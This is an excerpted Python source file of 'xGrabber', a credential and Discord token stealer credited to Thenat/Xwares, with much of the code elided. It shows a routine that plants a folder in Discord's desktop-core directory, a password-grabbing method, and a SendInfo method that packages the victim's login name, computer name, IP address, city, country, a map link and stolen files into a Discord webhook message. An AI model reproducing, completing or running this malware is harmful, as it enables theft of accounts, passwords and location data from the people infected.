...
class xGrabber:
            ...
            for name in dirs:
                if (name.__contains__("discord_desktop_core-")):
                    try:
                        ...
                        os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\xGrabber"))
    ...
    def grabPassword(self):
        ...
        f.write("Made by Thenat | https://dsc.gg/Xwares\n\n")
    ...
    def SendInfo(self):
        ...
        embed = {
            "avatar_url":"https://cdn.discordapp.com/attachments/903186422171848717/904067475770060800/c0db44df90166ebf1567a854cbdf194f_1.png",
            "embeds": [
                {
                    "author": {
                        "name": "xGrabber.V1",
                        "url": "https://dsc.gg/Xwares",
                        "icon_url": "https://cdn.discordapp.com/attachments/903186422171848717/904067475770060800/c0db44df90166ebf1567a854cbdf194f_1.png"
                    },
                    "description": f"**{os.getlogin()}** Xwares Token Grabber.V2\n```fix\nComputerName: {os.getenv('COMPUTERNAME')}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```",
                    "color": 000000,

                    "thumbnail": {
                      "url": "https://cdn.discordapp.com/attachments/903186422171848717/904067575145697370/c0db44df90166ebf1567a854cbdf194f_2.png"
                    },       

                    "footer": {
                      "text": "©THENAT#0914 https://dsc.gg/xwares"
                    }
                }
            ]
        }
